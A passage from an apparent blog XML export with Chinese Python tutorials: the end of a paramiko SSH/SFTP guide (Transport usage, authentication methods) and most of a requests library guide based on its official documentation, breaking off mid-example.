class="comment">#关闭连接</span></span><br></pre></td></tr></table></figure><p>使用这种方式，代码会更复杂，但是能完成需要I&#x2F;O的操作。本质是模拟terminal伪终端，并且在<code>chan = ssh.invoke_shell()</code>中，还可以指定伪终端宽高等参数，详细可自行查询paramiko关于<code>invoke_shell()</code>的文档。</p><h1 id="SFTPClient-1"><a href="#SFTPClient-1" class="headerlink" title="SFTPClient"></a>SFTPClient</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">localpath, remotepath</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        trans = paramiko.Transport((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">22</span>))</span><br><span class="line">        trans.connect(username=<span class="string">&quot;root&quot;</span>, password=<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">        sftpobject = paramiko.SFTPClient.from_transport(trans)</span><br><span class="line">        sftpobject.put(localpath, remotepath)</span><br><span class="line">        trans.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">remotepath, localpath</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        trans = paramiko.Transport((host,<span class="number">22</span>))</span><br><span class="line">        trans.connect(username=<span class="string">&quot;root&quot;</span>, password=passwd)</span><br><span class="line">        sftpobject = paramiko.SFTPClient.from_transport(trans)</span><br><span class="line">        sftpobject.get(remotepath, localpath)</span><br><span class="line">        trans.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><h1 id="Transport-1"><a href="#Transport-1" class="headerlink" title="Transport"></a>Transport</h1><p><code>Transport</code>的重要应用场景之一，是作为<code>SSHClient</code>的低级API。然而对于部分特殊场景，<code>SSHClient</code>封装了太多检查操作，可能不太符合实际需求，例如无密码认证、无视hostkey检查等，<code>Transport</code>可能更加符合需要。</p><h2 id="自定义认证"><a href="#自定义认证" class="headerlink" title="自定义认证"></a>自定义认证</h2><p><code>SSHClient.connect()</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh = paramiko.SSHClient()</span><br><span class="line">ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) <span class="comment">#自动接受并将hostkey加入known_hosts列表</span></span><br><span class="line">ssh.connect(hostname=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">22</span>, username=<span class="string">&#x27;root&#x27;</span>, password=<span class="string">&#x27;123456&#x27;</span>)</span><br></pre></td></tr></table></figure><p>可以做如下替换：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">trans = paramiko.Transport((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">22</span>))</span><br><span class="line">trans.connect(hostkey=<span class="literal">None</span>, username=<span class="string">&quot;root&quot;</span>, password=<span class="string">&quot;123456&quot;</span>) <span class="comment">#transport支持忽略hostkey检查或自定义hostkey参数</span></span><br><span class="line">ssh = paramiko.SSHClient()</span><br><span class="line">ssh._transport = trans <span class="comment">#更换ssh对象内置_transport</span></span><br></pre></td></tr></table></figure><p><code>Transport.connect()</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trans.connect(username=<span class="string">&quot;root&quot;</span>, password=<span class="string">&quot;123456&quot;</span>)</span><br></pre></td></tr></table></figure><p>可以做如下替换：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">trans.start_client()</span><br><span class="line">trans.auth_none(username=<span class="string">&quot;root&quot;</span>) <span class="comment"># 使用无密码认证</span></span><br></pre></td></tr></table></figure><h2 id="获取伪终端"><a href="#获取伪终端" class="headerlink" title="获取伪终端"></a>获取伪终端</h2><p><code>SSHClient.invoke_shell()</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chan = ssh.invoke_shell(term=<span class="string">&quot;xterm&quot;</span>) <span class="comment">#获取伪terminal</span></span><br></pre></td></tr></table></figure><p>可以做如下替换：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chan = trans.open_session()</span><br><span class="line">chan.get_pty(term=<span class="string">&quot;xterm&quot;</span>)</span><br><span class="line">chan.invoke_shell()</span><br></pre></td></tr></table></figure><p>看一遍<code>SSHClient</code>和<code>Transport</code>的源代码后就很容易理解上述操作意义。</p><h1 id="认证方式"><a href="#认证方式" class="headerlink" title="认证方式"></a>认证方式</h1><h2 id="密码认证"><a href="#密码认证" class="headerlink" title="密码认证"></a>密码认证</h2><p>在<code>connect()</code>传入<code>password</code>参数即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh.connect(hostname=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">22</span>, username=<span class="string">&#x27;root&#x27;</span>, password=<span class="string">&#x27;123456&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="密钥认证"><a href="#密钥认证" class="headerlink" title="密钥认证"></a>密钥认证</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">private_key = paramiko.RSAKey.from_private_key_file(filename=<span class="string">&#x27;[User_Home_Dir]/.ssh/id_rsa&#x27;</span>, password=<span class="string">&#x27;123&#x27;</span>) <span class="comment">#加载私钥，password为私钥密码</span></span><br><span class="line">ssh.connect(hostname=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">22</span>, username=<span class="string">&#x27;root&#x27;</span>, pkey=private_key)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python3 </tag>
            
            <tag> paramiko </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3之requests</title>
      <link href="/2021/06/05/Tools/requests/"/>
      <url>/2021/06/05/Tools/requests/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文参考自<a href="https://docs.python-requests.org/zh_CN/latest/">requests官方文档</a></p></blockquote><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure><h1 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h1><h2 id="基本请求"><a href="#基本请求" class="headerlink" title="基本请求"></a>基本请求</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r1 = requests.get(<span class="string">&#x27;https://api.github.com/events&#x27;</span>) <span class="comment"># GET请求</span></span><br><span class="line">r2 = requests.post(<span class="string">&#x27;http://httpbin.org/post&#x27;</span>, data = &#123;<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;) <span class="comment"># POST请求</span></span><br><span class="line">r3 = requests.put(<span class="string">&#x27;http://httpbin.org/put&#x27;</span>, data = &#123;<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;) <span class="comment"># PUT请求</span></span><br><span class="line">r4 = requests.delete(<span class="string">&#x27;http://httpbin.org/delete&#x27;</span>) <span class="comment"># DELETE请求</span></span><br><span class="line">r5 = requests.head(<span class="string">&#x27;http://httpbin.org/get&#x27;</span>) <span class="comment"># HEAD请求</span></span><br><span class="line">r6 = requests.options(<span class="string">&#x27;http://httpbin.org/get&#x27;</span>) <span class="comment"># OPTIONS请求</span></span><br></pre></td></tr></table></figure><p>请求返回一个<code>Response</code>对象。</p><h2 id="传递URL参数"><a href="#传递URL参数" class="headerlink" title="传递URL参数"></a>传递URL参数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用params参数：</span></span><br><span class="line">payload = &#123;<span class="string">&#x27;key1&#x27;</span>: <span class="string">&#x27;value1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>: <span class="string">&#x27;value2&#x27;</span>&#125;</span><br><span class="line">r1 = requests.get(<span class="string">&quot;http://httpbin.org/get&quot;</span>, params=payload)</span><br><span class="line"><span class="comment"># 也可以手动构造：</span></span><br><span class="line">r2 = requests.get(<span class="string">&quot;http://httpbin.org/get?key1=value1&amp;key2=value2&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Response对象"><a href="#Response对象" class="headerlink" title="Response对象"></a>Response对象</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.get(<span class="string">&#x27;https://api.github.com/events&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.content) <span class="comment"># 原始字节串</span></span><br><span class="line"><span class="comment">#out&gt; b&#x27;[&#123;&quot;repository&quot;:&#123;&quot;open_issues&quot;:0,&quot;url&quot;:&quot;https://github.com/...</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text) <span class="comment"># 自动默认UTF-8解码</span></span><br><span class="line"><span class="comment">#out&gt; u&#x27;[&#123;&quot;repository&quot;:&#123;&quot;open_issues&quot;:0,&quot;url&quot;:&quot;https://github.com/...</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.encoding) <span class="comment"># 可通过设置encoding改变r.text的默认编码</span></span><br><span class="line"><span class="comment">#out&gt; &#x27;utf-8&#x27;</span></span><br><span class="line">r.encoding = <span class="string">&#x27;ISO-8895-1&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.json()) <span class="comment"># 内置json解码器，返回一个dict，如果解码失败则抛出异常</span></span><br><span class="line"><span class="comment">#out&gt; [&#123;u&#x27;repository&#x27;: &#123;u&#x27;open_issues&#x27;: 0, u&#x27;url&#x27;: &#x27;https://github.com/...</span></span><br></pre></td></tr></table></figure><h2 id="原始套接字响应"><a href="#原始套接字响应" class="headerlink" title="原始套接字响应"></a>原始套接字响应</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(<span class="string">&#x27;https://api.github.com/events&#x27;</span>, stream=<span class="literal">True</span>)</span><br><span class="line">r.raw</span><br><span class="line"><span class="comment">#out&gt; &lt;requests.packages.urllib3.response.HTTPResponse object at 0x101194810&gt;</span></span><br><span class="line">r.raw.read(<span class="number">10</span>)</span><br><span class="line"><span class="comment">#out&gt; &#x27;\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03&#x27;</span></span><br></pre></td></tr></table></figure><p>但是一般情况建议使用<code>Response.iter_content</code>将字节流保存到文件，<code>chunk_size</code>可自由指定大小（缓冲大小）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fd:</span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> r.iter_content(chunk_size):</span><br><span class="line">        fd.write(chunk)</span><br></pre></td></tr></table></figure><h2 id="定制请求头"><a href="#定制请求头" class="headerlink" title="定制请求头"></a>定制请求头</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;https://api.github.com/some/endpoint&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;my-app/0.0.1&#x27;</span>&#125;</span><br><span class="line">r = requests.get(url, headers=headers) <span class="comment"># 使用headers字典参数传递请求头</span></span><br></pre></td></tr></table></figure><h2 id="POST请求体"><a href="#POST请求体" class="headerlink" title="POST请求体"></a>POST请求体</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">&#x27;key1&#x27;</span>: <span class="string">&#x27;value1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>: <span class="string">&#x27;value2&#x27;</span>&#125;</span><br><span class="line">r1 = requests.post(<span class="string">&quot;http://httpbin.org/post&quot;</span>, data=payload) <span class="comment"># 常给data参数传递字典</span></span><br><span class="line"></span><br><span class="line">payload = ((<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;value1&#x27;</span>), (<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;value2&#x27;</span>))</span><br><span class="line">r2 = requests.post(<span class="string">&quot;http://httpbin.org/post&quot;</span>, data=payload) <span class="comment"># 给data参数传递元组列表，适用于key1=1&amp;key1=2这类情况</span></span><br></pre></td></tr></table></figure><p>有时请求体不一定是表单格式，例如json格式，或无规则的字节串，可以给data直接传递string。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json, requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://api.github.com/some/endpoint&#x27;</span></span><br><span class="line">payload = &#123;<span class="string">&#x27;some&#x27;</span>: <span class="string">&#x27;data&#x27;</span>&#125;</span><br><span class="line">r = requests.post(url, data=json.dumps(payload)) <span class="comment"># 传递一个string</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://api.github.com/some/endpoint&#x27;</span></span><br><span class="line">payload = &#123;<span class="string">&#x27;some&#x27;</span>: <span class="string">&#x27;data&#x27;</span>&#125;</span><br><span class="line">r = requests.post(url, json=payload) <span class="comment"># 对于json可使用json参数直接传递，会用内置json编码器编码</span></span><br></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>POST一个多部分编码(Multipart-Encoded)的文件<br>Requests 使得上传多部分编码文件变得很简单：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;report.xls&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, files=files)</span><br><span class="line">r.text</span><br><span class="line"><span class="comment">#out&gt; </span></span><br><span class="line"><span class="comment">#&#123;</span></span><br><span class="line"><span class="comment">#  ...</span></span><br><span class="line"><span class="comment">#  &quot;files&quot;: &#123;</span></span><br><span class="line"><span class="comment">#    &quot;file&quot;: &quot;&lt;censored...binary...data&gt;&quot;</span></span><br><span class="line"><span class="comment">#  &#125;,</span></span><br><span class="line"><span class="comment">#  ...</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br></pre></td></tr></table></figure><p>可以显式地设置文件名，文件类型和请求头：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;report.xls&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;report.xls&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;application/vnd.ms-excel&#x27;</span>, &#123;<span class="string">&#x27;Expires&#x27;</span>: <span class="string">&#x27;0&#x27;</span>&#125;)&#125;</span><br><span class="line">r = requests.post(url, files=files)</span><br><span class="line">r.text</span><br><span class="line"><span class="comment">#out&gt;</span></span><br><span class="line"><span class="comment">#&#123;</span></span><br><span class="line"><span class="comment">#  ...</span></span><br><span class="line"><span class="comment">#  &quot;files&quot;: &#123;</span></span><br><span class="line"><span class="comment">#    &quot;file&quot;: &quot;&lt;censored...binary...data&gt;&quot;</span></span><br><span class="line"><span class="comment">#  &#125;,</span></span><br><span class="line"><span class="comment">#  ...</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br></pre></td></tr></table></figure><p>也可以发送作为文件来接收的字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;report.csv&#x27;</span>, <span class="string">&#x27;some,data,to,send\nanother,row,to,send\n&#x27;</span>)&#125;</span><br><span class="line">r = requests.post(url, files=files)</span><br><span class="line">r.text</span><br><span class="line"><span class="comment">#out&gt;</span></span><br><span class="line"><span class="comment">#&#123;</span></span><br><span class="line"><span class="comment">#  ...</span></span><br><span class="line"><span class="comment">#  &quot;files&quot;: &#123;</span></span><br><span class="line"><span class="comment">#    &quot;file&quot;: &quot;some,data,to,send\\nanother,row,to,send\\n&quot;</span></span><br><span class="line"><span class="comment">#  &#125;,</span></span><br><span class="line"><span class="comment">#  ...</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br></pre></td></tr></table></figure><p>如果发送一个非常大的文件作为 multipart&#x2F;form-data 请求，希望将请求做成数据流。默认下requests不支持,但有个第三方包requests-toolbelt是支持的。可以阅读<a href="https://toolbelt.rtfd.org/">toolbelt文档</a>来了解使用方法。</p><div class="note warning flat"><p>强烈建议用二进制模式打开文件。这是因为Requests会提供<code>Content-Length</code>，这个值会被设为文件的字节数（bytes）。如果用文本模式打开文件，就可能会发生错误。</p></div><h2 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(<span class="string">&#x27;http://httpbin.org/get&#x27;</span>)</span><br><span class="line">r.status_code</span><br><span class="line"><span class="comment">#out&gt; 200</span></span><br><span class="line"><span class="comment"># 为方便引用，Requests还附带了一个内置的状态码查询对象：</span></span><br><span class="line">r.status_code == requests.codes.ok</span><br><span class="line"><span class="comment">#out&gt; True</span></span><br></pre></td></tr></table></figure><p>如果发送了一个错误请求(4XX,5XX)，可以通过<code>Response.raise_for_status()</code>来抛出异常：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">bad_r = requests.get(<span class="string">&#x27;http://httpbin.org/status/404&#x27;</span>)</span><br><span class="line">bad_r.status_code</span><br><span class="line"><span class="comment">#out&gt; 404</span></span><br><span class="line"></span><br><span class="line">bad_r.raise_for_status()</span><br><span class="line"><span class="comment">#out&gt; </span></span><br><span class="line"><span class="comment">#Traceback (most recent call last):</span></span><br><span class="line"><span class="comment">#  File &quot;requests/models.py&quot;, line 832, in raise_for_status</span></span><br><span class="line"><span class="comment">#    raise http_error</span></span><br><span class="line"><span class="comment">#requests.exceptions.HTTPError: 404 Client Error</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># status_code是200时，raise_for_status()为None：</span></span><br><span class="line"></span><br><span class="line">r.raise_for_status()</span><br><span class="line"><span class="comment">#out&gt; None</span></span><br></pre></td></tr></table></figure><h2 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">r.headers</span><br><span class="line"><span class="comment">#out&gt;</span></span><br><span class="line"><span class="comment">#&#123;</span></span><br><span class="line"><span class="comment">#    &#x27;content-encoding&#x27;: &#x27;gzip&#x27;,</span></span><br><span class="line"><span class="comment">#    &#x27;transfer-encoding&#x27;: &#x27;chunked&#x27;,</span></span><br><span class="line"><span class="comment">#    &#x27;connection&#x27;: &#x27;close&#x27;,</span></span><br><span class="line"><span class="comment">#    &#x27;server&#x27;: &#x27;nginx/1.0.4&#x27;,</span></span><br><span class="line"><span class="comment">#    &#x27;x-runtime&#x27;: &#x27;148ms&#x27;,</span></span><br><span class="line"><span class="comment">#    &#x27;etag&#x27;: &#x27;&quot;e1ca502697e5c9317743dc078f67693f&quot;&#x27;,</span></span><br><span class="line"><span class="comment">#    &#x27;content-type&#x27;: &#x27;application/json&#x27;</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据RFC2616， HTTP 头部是大小写不敏感的。可以使用任意大写形式来访问这些响应头字段：</span></span><br><span class="line">r.headers[<span class="string">&#x27;Content-Type&#x27;</span>]</span><br><span class="line"><span class="comment">#out&gt; &#x27;application/json&#x27;</span></span><br><span class="line"></span><br><span class="line">r.headers.get(<span class="string">&#x27;content-type&#x27;</span>)</span><br><span class="line"><span class="comment">#out&gt; &#x27;application/json&#x27;</span></span><br></pre></td></tr></table></figure><p>它还有一个特殊点，那就是服务器可以多次接受同一header，每次都使用不同的值。但Requests会将它们合并，这样它们就可以用一个映射来表示出来，参见RFC7230:</p><blockquote><p>A recipient MAY combine multiple header fields with the same field name into one “field-name: field-value” pair, without changing the semantics of the message, by appending each subsequent field value to the combined field value in order, separated by a comma.</p></blockquote><p>接收者可以合并多个相同名称的header栏位，把它们合为一个”field-name: field-value”配对，将每个后续的栏位值依次追加到合并的栏位值中，用逗号隔开即可，这样做不会改变信息的语义。</p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>如果某个响应中包含一些 cookie，可以快速访问它们：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://example.com/some/cookie/setting/url&#x27;</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line"></span><br><span class="line">r.cookies[<span class="string">&#x27;example_cookie_name&#x27;</span>]</span><br><span class="line"><span class="comment">#out&gt; &#x27;example_cookie_value&#x27;</span></span><br></pre></td></tr></table></figure><p>发送cookies到服务器，可以使用cookies参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://httpbin.org/cookies&#x27;</span></span><br><span class="line">cookies = <span class="built_in">dict</span>(cookies_are=<span class="string">&#x27;working&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(url, cookies=cookies)</span><br><span class="line">r.text</span><br><span class="line"><span class="comment">#out&gt; &#x27;&#123;&quot;cookies&quot;: &#123;&quot;cookies_are&quot;: &quot;working&quot;&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Cookie的返回对象为RequestsCookieJar，它的行为和字典类似，但接口更为完整，适合跨域名跨路径使用。可以把Cookie Jar传到Requests中：</span></span><br><span class="line">jar = requests.cookies.RequestsCookieJar()</span><br><span class="line">jar.<span class="built_in">set</span>(<span class="string">&#x27;tasty_cookie&#x27;</span>, <span class="string">&#x27;yum&#x27;</span>, domain=<span class="string">&#x27;httpbin.org&#x27;</span>, path=<span class="string">&#x27;/cookies&#x27;</span>)</span><br><span class="line">jar.<span class="built_in">set</span>(<span class="string">&#x27;gross_cookie&#x27;</span>, <span class="string">&#x27;blech&#x27;</span>, domain=<span class="string">&#x27;httpbin.org&#x27;</span>, path=<span class="string">&#x27;/elsewhere&#x27;</span>)</span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org/cookies&#x27;</span></span><br><span class="line">r = requests.get(url, cookies=jar)</span><br><span class="line">r.text</span><br><span class="line"><span class="comment">#out&gt; &#x27;&#123;&quot;cookies&quot;: &#123;&quot;tasty_cookie&quot;: &quot;yum&quot;&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="重定向与请求历史"><a href="#重定向与请求历史" class="headerlink" title="重定向与请求历史"></a>重定向与请求历史</h2><p>默认情况下，除了HEAD,Requests会自动处理所有重定向。<br>可以使用响应对象的history方法来追踪重定向。Response.history是一个Response对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。</p><p>例如，Github 将所有的 HTTP 请求重定向到 HTTPS：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(<span class="string">&#x27;http://github.com&#x27;</span>)</span><br><span class="line">r.url</span><br><span class="line"><span class="comment">#out&gt; &#x27;https://github.com/&#x27;</span></span><br><span class="line"></span><br><span class="line">r.status_code</span><br><span class="line"><span class="comment">#out&gt; 200</span></span><br><span class="line"></span><br><span class="line">r.history</span><br><span class="line"><span class="comment">#out&gt; [&lt;Response [301]&gt;]</span></span><br></pre></td></tr></table></figure><p>如果使用的是GET、OPTIONS、POST、PUT、PATCH或者DELETE，那么可以通过allow_redirects参数禁用重定向处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(<span class="string">&#x27;http://github.com&#x27;</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">r.status_code</span><br><span class="line"><span class="comment">#out&gt; 301</span></span><br><span class="line">r.history</span><br><span class="line"><span class="comment">#out&gt; []</span></span><br></pre></td></tr></table></figure><p>如果使用了 HEAD，你也可以启用重定向：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r = requests.head(<span 